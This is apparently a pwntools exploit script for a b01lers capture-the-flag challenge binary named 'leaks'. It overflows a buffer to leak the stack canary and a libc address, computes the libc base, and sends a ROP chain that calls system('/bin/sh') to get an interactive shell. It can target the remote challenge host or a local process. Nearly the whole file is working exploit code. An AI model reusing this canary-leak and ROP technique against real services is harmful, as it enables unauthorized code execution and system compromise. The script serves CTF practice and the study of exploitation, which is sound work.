"""
Leak stack canary, leak libc, rop to system("/bin/sh")
"""
from pwn import *

binary_path = "./leaks"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")


gs="""


python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break * 0x401229
#break main

#break * 0x401208

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.ctf.b01lers.com 1009
        return remote("chal.ctf.b01lers.com", 1009)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if msg is not None:
        print(f"*** BREAKPOINT: {msg} ***")
    else:
        print("*** BREAKPOINT ***")
    io.interactive()


io = start()

io.recvline()

io.sendline("1")
io.sendline("a")

# breakpoint(io, "Leak stack cookie")
io.clean()

io.sendline("24")
io.sendline("a"*24)

io.recvline()
canary = io.recvline()[:-1].rjust(8, b"\0")

print(f"CANARY: {hex(u64(canary))}")
print(f"LEN CANARY: {len(canary)}")

# breakpoint(io, "Leak libc")
LIBC_LEAK_OFFSET = 0x270b3

io.clean()

io.sendline(f"{0x27}")
io.sendline("a"*0x27)

io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8, b"\0"))
libc.address = libc_leak - LIBC_LEAK_OFFSET

print(f"LIBC: {hex(libc.address)}")

binsh_addr = next(libc.search(b"/bin/sh\0"))
RET = 0x25679

rop = ROP(libc)
rop.raw(libc.address + RET)
rop.system(binsh_addr)

payload = flat({
    0x18: canary,
    0x20: p64(0x1234567887654321),
    0x28: rop.chain()
})

breakpoint(io, "ABOUT TO SEND PAYLOAD")

io.sendline(f"{len(payload)}")
io.sendline(payload)

io.interactive()
